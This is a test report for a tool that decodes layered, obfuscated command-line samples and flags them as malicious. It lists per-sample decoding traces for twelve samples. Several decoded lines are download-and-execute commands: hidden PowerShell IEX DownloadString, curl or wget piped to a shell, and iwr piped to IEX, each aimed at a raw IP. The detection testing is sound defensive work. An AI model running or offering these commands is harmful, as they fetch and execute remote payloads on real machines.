# X-RAY + URL-heuristic — Battery Run 2 (v1.5.6)

**Run:** `2026-07-18T18:23:25.703091Z`  ·  **Env:** preview  ·  **API:** `https://greeting-app-5782.preview.emergentagent.com`

## Fixes under test
1. **Client X-RAY:** BROKEN/MIXED mid-chain → 🩵 SALVAGED when a downstream layer recovers (`frontend/src/components/DecodingTracePanel.jsx`).
2. **Backend URL-decode:** fire on a single-`%XX` escape at position 0 or last-3 chars when the remainder is a pure b64/hex charset (`backend/smart_decoder.py` step 5).

## Summary

| # | Sample | Wrap | Chain | Verdict | Score | IOCs | MITRE | HTTP ms | Downgrades | Token match |
|---|---|---|---:|---|---:|---:|---:|---:|---:|:---:|
| 1 | `R2_S01_cobalt_5layer` | `URL(b64(hex(rev(b64(P)))))` | 5 | Malicious | 100 | 3 | 4 | 18441 | **1** | ✅ |
| 2 | `R2_S02_mshta_3layer` | `URL(rev(b64(P)))` | 3 | Suspicious | 100 | 1 | 1 | 13314 | **1** | ✅ |
| 3 | `R2_S03_certutil_3layer` | `URL(rev(b64(P)))` | 4 | Malicious | 100 | 2 | 2 | 13906 | **1** | ✅ |
| 4 | `R2_S04_curl_urlurl_b64` | `URL(URL(b64(P)))` | 2 | Malicious | 100 | 4 | 1 | 1853 | **1** | ✅ |
| 5 | `R2_S05_iwr_url_b64` | `URL(b64(P))` | 2 | Malicious | 100 | 3 | 2 | 13370 | **0** | ✅ |
| 6 | `R2_S06_bits_b64_hex` | `b64(hex(P))` | 5 | Malicious | 100 | 3 | 4 | 1845 | **1** | ✅ |
| 7 | `R2_S07_regsvr_5layer` | `URL(b64(hex(rev(b64(P)))))` | 6 | Malicious | 100 | 2 | 3 | 13894 | **2** | ✅ |
| 8 | `R2_S08_wget_b64_gzip` | `b64(gzip(P))` | 3 | Malicious | 100 | 4 | 1 | 1754 | **1** | ✅ |
| 9 | `R2_S09_cobalt_triple` | `b64(b64(b64(P)))` | 3 | Malicious | 100 | 3 | 4 | 18393 | **0** | ✅ |
| 10 | `R2_S10_rundll32_hex` | `hex(b64(rev(P)))` | 4 | Malicious | 100 | 2 | 3 | 13741 | **2** | ✅ |
| 11 | `R2_S11_mshta_urlurl_b64` | `URL(URL(b64(P)))` | 2 | Suspicious | 100 | 1 | 1 | 13335 | **1** | ✅ |
| 12 | `R2_S12_bits_url_b64` | `URL(b64(P))` | 4 | Malicious | 100 | 3 | 3 | 1705 | **1** | ✅ |

## Aggregate

- Samples: **12**  ·  Passing (token match): **12/12** (100%)
- Total SALVAGED downgrades: **12**
- Malicious verdicts: **10/12**

## Per-sample layer trace

### R2_S01_cobalt_5layer · `URL(b64(hex(rev(b64(P)))))`

- Verdict `Malicious` · Score `100` · Conf `100` · HTTP `18441 ms`
- Expected token `powershell` · Decoded first line `powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString("http://45.148.10.181/beacon.ps1")`
- Salvage downgrades: **1**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `url-decode` | 396 | 🟢 `OK` | 🟢 `OK` | 0 valid %-escapes |
| L1 | `base64-decode` | 296 | 🟢 `OK` | 🟢 `OK` | b64 len 296 · 4k+0 |
| L2 | `hex-decode` | 148 | 🔴 `BROKEN` | 🩵 `SALVAGED` | non-hex chars → downstream 'reverse' recovered |
| L3 | `reverse` | 148 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L4 | `base64-decode` | 109 | 🟡 `MIXED` | 🟡 `MIXED` | non-b64 chars present |

### R2_S02_mshta_3layer · `URL(rev(b64(P)))`

- Verdict `Suspicious` · Score `100` · Conf `100` · HTTP `13314 ms`
- Expected token `mshta` · Decoded first line `# --- MSHTA LOLBAS Loader Detected ---`
- Salvage downgrades: **1**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `reverse` | 112 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L1 | `base64-decode` | 84 | 🔴 `BROKEN` | 🩵 `SALVAGED` | b64 len 81 ≡ 4k+1 → downstream 'mshta-annotate' recovered |
| L2 | `mshta-annotate` | 84 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### R2_S03_certutil_3layer · `URL(rev(b64(P)))`

- Verdict `Malicious` · Score `100` · Conf `100` · HTTP `13906 ms`
- Expected token `certutil` · Decoded first line `# --- Certutil LOLBAS Workflow Detected ---`
- Salvage downgrades: **1**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `url-decode` | 116 | 🟢 `OK` | 🟢 `OK` | 0 valid %-escapes |
| L1 | `reverse` | 116 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L2 | `base64-decode` | 86 | 🔴 `BROKEN` | 🩵 `SALVAGED` | b64 len 81 ≡ 4k+1 → downstream 'certutil-annotate' recovered |
| L3 | `certutil-annotate` | 86 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### R2_S04_curl_urlurl_b64 · `URL(URL(b64(P)))`

- Verdict `Malicious` · Score `100` · Conf `100` · HTTP `1853 ms`
- Expected token `curl` · Decoded first line `curl -fsSL http://172.104.244.51/inst.sh | sh`
- Salvage downgrades: **1**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `base64-decode` | 45 | 🔴 `BROKEN` | 🩵 `SALVAGED` | b64 len 41 ≡ 4k+1 → downstream 'download-shell-bg' recovered |
| L1 | `download-shell-bg` | 45 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### R2_S05_iwr_url_b64 · `URL(b64(P))`

- Verdict `Malicious` · Score `100` · Conf `100` · HTTP `13370 ms`
- Expected token `IEX` · Decoded first line `IEX(iwr -useb http://39.108.99.24/a.ps1)`
- Salvage downgrades: **0**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `extract-payload` | 54 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L1 | `base64-decode` | 40 | 🟡 `MIXED` | 🟡 `MIXED` | non-b64 chars present |

### R2_S06_bits_b64_hex · `b64(hex(P))`

- Verdict `Malicious` · Score `100` · Conf `100` · HTTP `1845 ms`
- Expected token `cmd` · Decoded first line `# --- Bitsadmin File Transfer Detected ---`
- Salvage downgrades: **1**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `base64-decode` | 180 | 🟢 `OK` | 🟢 `OK` | b64 len 180 · 4k+0 |
| L1 | `hex-decode` | 90 | 🔴 `BROKEN` | 🩵 `SALVAGED` | non-hex chars → downstream 'env-expand' recovered |
| L2 | `env-expand` | 134 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L3 | `bitsadmin-annotate` | 134 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L4 | `native-cmd-explain` | 134 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### R2_S07_regsvr_5layer · `URL(b64(hex(rev(b64(P)))))`

- Verdict `Malicious` · Score `100` · Conf `100` · HTTP `13894 ms`
- Expected token `regsvr32` · Decoded first line `# --- Regsvr32 Scriptlet Loader Detected (Squiblydoo) ---`
- Salvage downgrades: **2**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `url-decode` | 204 | 🟢 `OK` | 🟢 `OK` | 0 valid %-escapes |
| L1 | `base64-decode` | 152 | 🟢 `OK` | 🟢 `OK` | b64 len 152 · 4k+0 |
| L2 | `hex-decode` | 76 | 🔴 `BROKEN` | 🩵 `SALVAGED` | non-hex chars → downstream 'reverse' recovered |
| L3 | `reverse` | 76 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L4 | `base64-decode` | 57 | 🔴 `BROKEN` | 🩵 `SALVAGED` | b64 len 53 ≡ 4k+1 → downstream 'regsvr32-annotate' recovered |
| L5 | `regsvr32-annotate` | 57 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### R2_S08_wget_b64_gzip · `b64(gzip(P))`

- Verdict `Malicious` · Score `100` · Conf `100` · HTTP `1754 ms`
- Expected token `wget` · Decoded first line `wget -qO- http://198.51.100.42/loader.sh | bash`
- Salvage downgrades: **1**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `base64-decode` | 67 | 🔴 `BROKEN` | 🩵 `SALVAGED` | b64 len 65 ≡ 4k+1 → downstream 'gzip-decompress' recovered |
| L1 | `gzip-decompress` | 47 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L2 | `download-shell-bg` | 47 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### R2_S09_cobalt_triple · `b64(b64(b64(P)))`

- Verdict `Malicious` · Score `100` · Conf `100` · HTTP `18393 ms`
- Expected token `powershell` · Decoded first line `powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString("http://45.148.10.181/beacon.ps1")`
- Salvage downgrades: **0**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `base64-decode` | 200 | 🟢 `OK` | 🟢 `OK` | b64 len 198 · 4k+2 |
| L1 | `base64-decode` | 148 | 🟢 `OK` | 🟢 `OK` | b64 len 146 · 4k+2 |
| L2 | `base64-decode` | 109 | 🟡 `MIXED` | 🟡 `MIXED` | non-b64 chars present |

### R2_S10_rundll32_hex · `hex(b64(rev(P)))`

- Verdict `Malicious` · Score `100` · Conf `100` · HTTP `13741 ms`
- Expected token `rundll32` · Decoded first line `# --- Rundll32 JavaScript/HTMLApplication Loader Detected ---`
- Salvage downgrades: **2**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `hex-decode` | 204 | 🔴 `BROKEN` | 🩵 `SALVAGED` | non-hex chars → downstream 'reverse' recovered |
| L1 | `reverse` | 204 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L2 | `base64-decode` | 151 | 🔴 `BROKEN` | 🩵 `SALVAGED` | b64 len 149 ≡ 4k+1 → downstream 'rundll32-annotate' recovered |
| L3 | `rundll32-annotate` | 151 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### R2_S11_mshta_urlurl_b64 · `URL(URL(b64(P)))`

- Verdict `Suspicious` · Score `100` · Conf `100` · HTTP `13335 ms`
- Expected token `mshta` · Decoded first line `# --- MSHTA LOLBAS Loader Detected ---`
- Salvage downgrades: **1**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `base64-decode` | 84 | 🔴 `BROKEN` | 🩵 `SALVAGED` | b64 len 81 ≡ 4k+1 → downstream 'mshta-annotate' recovered |
| L1 | `mshta-annotate` | 84 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### R2_S12_bits_url_b64 · `URL(b64(P))`

- Verdict `Malicious` · Score `100` · Conf `100` · HTTP `1705 ms`
- Expected token `cmd` · Decoded first line `# --- Bitsadmin File Transfer Detected ---`
- Salvage downgrades: **1**

| Layer | Op | Bytes | BEFORE | AFTER | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `base64-decode` | 90 | 🟡 `MIXED` | 🩵 `SALVAGED` | non-b64 chars present → downstream 'env-expand' recovered |
| L1 | `env-expand` | 134 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L2 | `bitsadmin-annotate` | 134 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L3 | `native-cmd-explain` | 134 | 🟢 `OK` | 🟢 `OK` | 100% printable |

## Artifacts

- Per-sample JSON: `/app/test_reports/xray_salvage_v156_run2/R2_S01_*.json … R2_S12_*.json`
- This report:    `/app/test_reports/xray_salvage_v156_run2/REPORT.md`
